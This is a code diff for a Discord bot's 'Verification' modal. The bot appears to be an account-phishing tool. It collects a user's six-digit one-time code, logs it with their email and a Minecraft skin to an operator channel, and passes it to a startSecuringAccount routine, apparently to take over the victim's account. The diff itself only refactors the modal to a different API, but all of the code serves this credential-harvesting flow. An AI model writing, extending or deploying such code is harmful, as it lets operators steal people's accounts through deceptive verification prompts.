@@ -12,17 +12,18 @@ from views.utils.initialSession import getSession
 
 config = json.load(open("config.json", "r+"))
 
-class MyModalTwo(ui.Modal, title="Verification"):
+class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
-        super().__init__()
+        super().__init__(title="Verification")
         self.username = username
         self.email = email
         self.flowtoken = flowtoken
+        self.add_item(ui.InputText(label="Code", required=True))
 
-    box_three = ui.TextInput(label="Code", required=True)
+    async def callback(self, interaction: discord.Interaction) -> None:
+        code = self.children[0].value
 
-    async def on_submit(self, interaction: discord.Interaction, /) -> None:
-        if len(str(self.box_three.value)) != 6:
+        if len(str(code)) != 6:
             await interaction.response.send_message(
                 embed = discord.Embed(
                     description = "The code must be 6 digits long."
@@ -37,7 +38,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         Code_embed = discord.Embed(
             title = f"User | {interaction.user.name}",
-            description=f"**Email** | **Status**\n```{self.email} | Got Code | {self.box_three.value}```",
+            description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
         ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username}")
@@ -53,13 +54,13 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         self.session = getSession()
 
-        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
+        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
         
         if not securedAccount:
 
             await logs_channel.send(
                 embed = discord.Embed(
-                    title = f"User | {interaction.user.name}({interaction.user.id})",
+                    title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
